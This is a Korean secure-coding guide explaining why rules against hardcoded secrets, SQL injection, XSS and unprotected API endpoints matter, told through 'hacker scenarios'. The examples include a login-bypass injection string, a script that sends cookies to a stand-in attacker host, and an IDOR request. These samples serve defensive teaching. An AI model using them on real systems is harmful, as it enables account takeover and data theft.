# VibeCoding 보안 가이드라인 설명: 왜 이렇게 강조할까요?

이 문서는 "보안 가이드라인"의 각 규칙의 중요성을 설명합니다. 이를 이해하면 코드를 "해커의 관점"에서 보고 문제가 발생하기 전에 예방할 수 있습니다.

---

## ⭐ 황금 규칙

### 【비밀 정보 하드코딩 금지】 & 【환경 변수 사용】 & 【비밀 파일 무시】

**왜 중요한가요?**

이 세 가지 규칙은 디지털 세계의 최고 생존 법칙입니다. 여러분의 코드는 (특히 Git을 사용할 때) 복사되고, 공유되고, 여러 곳에 저장됩니다. 비밀번호, API 키 및 기타 "비밀"을 코드에 직접 작성하는 것은 금고 비밀번호를 이마에 문신하는 것과 같습니다 - 여러분을 보는 사람(코드를 보는 사람)은 누구나 쉽게 금고를 열 수 있습니다.

**해커의 시나리오 😈**
> 저는 GitHub에서 `password`, `api_key` 또는 `db_connect`를 검색하는 것을 좋아합니다. 여러분의 공개 프로젝트를 찾았고 `config.js`라는 파일에서 이 코드를 봤습니다: `const db_password = 'Password123!';`. 완벽해요! 여러분의 사이트를 공격할 필요도 없이 이제 이 비밀번호로 데이터베이스에 직접 연결을 시도할 수 있습니다.

**재앙적인 결과 💥**

**서비스의 완전한 장악.** 해커들은 모든 사용자 데이터를 훔치고, 변경하고, 삭제할 수 있으며, 또는 여러분의 유료 API 서비스를 불법 활동에 사용할 수 있고, 모든 청구서는 여러분에게 전달됩니다.

---

## 📥 사용자 입력 처리

### 【SQL 인젝션 공격 방지】

**왜 중요한가요?**

데이터베이스를 SQL 언어만 이해하는 로봇으로 상상해보세요. 사용자 입력을 명령어와 직접 연결하면, 사용자가 자신만의 "명령어"를 말할 기회를 얻습니다. 매개변수화된 쿼리는 로봇에게 "들어봐, 다음 부분은 **단순한 데이터**야 - 내용이 무엇이든 명령어로 실행하지 마"라고 말합니다.

**해커의 시나리오 😈**
> 여러분 사이트의 로그인 창에서 사용자명으로 `' OR '1'='1' --`를 입력했습니다. 여러분의 SQL 쿼리가 이렇게 작성되었다고 가정합니다: `"SELECT * FROM users WHERE username = '" + userInput + "';`. 제 입력이 이것을 `SELECT * FROM users WHERE username = '' OR '1'='1' --';`로 바꿨습니다. `'1'='1'`은 항상 참이므로, 비밀번호 확인을 우회하고 첫 번째 사용자 계정(보통 관리자)으로 성공적으로 로그인했습니다.

**재앙적인 결과 💥**

공격자들은 로그인을 우회하고, 모든 데이터베이스 데이터(사용자 목록, 비밀번호 해시)를 훔치거나, 심지어 데이터베이스를 삭제할 수 있습니다.

### 【크로스 사이트 스크립팅(XSS) 공격 방지】

**왜 중요한가요?**

웹사이트가 사용자 입력 내용을 직접 반영하는 거울과 같다면, 사용자들은 콘텐츠에 악성 JavaScript 스크립트를 삽입할 수 있습니다. 다른 사용자가 이 콘텐츠를 탐색할 때, 악성 스크립트가 그들의 브라우저에서 실행되어 정보를 훔칩니다. HTML 엔티티 인코딩은 악성 스크립트의 특수 문자(`<`, `>` 등)를 무해한 일반 텍스트로 변환하여 실행되지 않도록 합니다.

**해커의 시나리오 😈**
> 여러분 기사의 댓글 섹션에 댓글을 남겼습니다: `<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>`. 이 텍스트가 데이터베이스에 그대로 저장되었습니다. 이제 이 댓글을 읽는 모든 사용자의 브라우저가 자동으로 이 스크립트를 실행하여 로그인 쿠키를 제 서버로 전송합니다. 쿠키로 그들의 신분을 사칭하여 웹사이트에 로그인할 수 있습니다.

**고급 공격 방법: 사용자 A의 코드가 어떻게 사용자 B의 데이터를 훔칠 수 있을까요?**

많은 분들이 궁금해합니다: "공격자가 제 웹사이트를 수정하지 않았는데, 어떻게 다른 사용자의 데이터를 훔칠 수 있나요?" 완전한 예시로 설명해 드리겠습니다:

1. **공격자 A가 악성 링크를 생성**
   ```
   https://yoursite.com/detail.php?id=1<script>steal()</script>
   ```

2. **공격자가 소셜 엔지니어링으로 피해자 B를 속임**
   - 이메일: "이 사진작가의 놀라운 작품들을 보세요!"
   - 소셜 미디어 게시물, 포럼 댓글 등

3. **피해자 B가 링크를 클릭하면 무슨 일이 일어날까요?**
   ```php
   // 여러분의 코드 (취약함)
   <meta property="og:url" content="<?php echo $_SERVER['REQUEST_URI']; ?>">
   
   // B의 브라우저에 실제 출력됨
   <meta property="og:url" content="/detail.php?id=1<script>steal()</script>">
   ```

4. **왜 B의 데이터를 훔칠 수 있을까요?**
   - B는 이미 여러분의 웹사이트에 로그인한 상태입니다
   - 악성 스크립트가 **여러분의 도메인** 하에서 실행되므로:
     - B의 쿠키(로그인 자격 증명)를 읽을 수 있습니다
     - B의 localStorage에 접근할 수 있습니다
     - B의 이름으로 요청을 보낼 수 있습니다
     - 페이지 내용을 수정할 수 있습니다(예: 가짜 로그인 양식)

**간단한 비유**
여러분의 웹사이트를 은행이라고 상상해보세요:
- 공격자 A가 은행 로비에 "가짜 출금 전표"(악성 스크립트)를 배치합니다
- 고객 B가 그것이 합법적이라고 생각하고 비밀번호를 입력합니다
- A가 B의 비밀번호를 얻습니다

XSS는 공격자들이 여러분의 "은행 로비"(웹사이트)에 "가짜 출금 전표"(악성 코드)를 배치할 수 있게 합니다.

따라서 `htmlspecialchars()`를 사용해야 합니다 - 이는 모든 사용자 입력이 실행 가능한 코드가 아닌 일반 텍스트로 표시되도록 보장합니다.

**재앙적인 결과 💥**

대규모 사용자 계정 도난, 개인 데이터 유출, 피싱 콘텐츠나 마이닝 스크립트로 웹사이트가 감염됨.

---

## 🔐 권한 및 인증

### 【API 엔드포인트 보호】

**왜 중요한가요?**

프론트엔드 인터페이스(UI)는 버튼을 숨길 수 있지만, 해커들은 인터페이스를 절대 신뢰하지 않습니다. 그들은 도구(Postman, curl 등)를 사용하여 백엔드 API를 직접 호출합니다. 모든 API 엔드포인트가 직접 공격받을 것이라고 가정해야 하므로, 각 엔드포인트는 독립적인 경비원이 되어 방문자의 신원과 권한을 스스로 확인해야 합니다.

**해커의 시나리오 😈**
> 개인 정보를 수정하기 위해 프론트엔드가 `/api/user/update`로 요청을 보낸다는 것을 발견했습니다. 다른 사람의 수정 버튼은 볼 수 없지만, 이 API가 `userId`를 통해 사용자를 구별한다고 가정했습니다. `/api/user/update?userId=1`(관리자 ID)로 수정하고 싶은 데이터와 함께 요청을 보내봤습니다. 세상에, 서버가 요청이 저 개인적으로 왔는지 확인하지 않고 관리자의 이메일을 성공적으로 변경했습니다!

**재앙적인 결과 💥**

일반 사용자가 다른 사용자나 심지어 관리자의 데이터를 변경하거나, 가져서는 안 될 권한을 실행하여 시스템 혼란을 야기할 수 있습니다.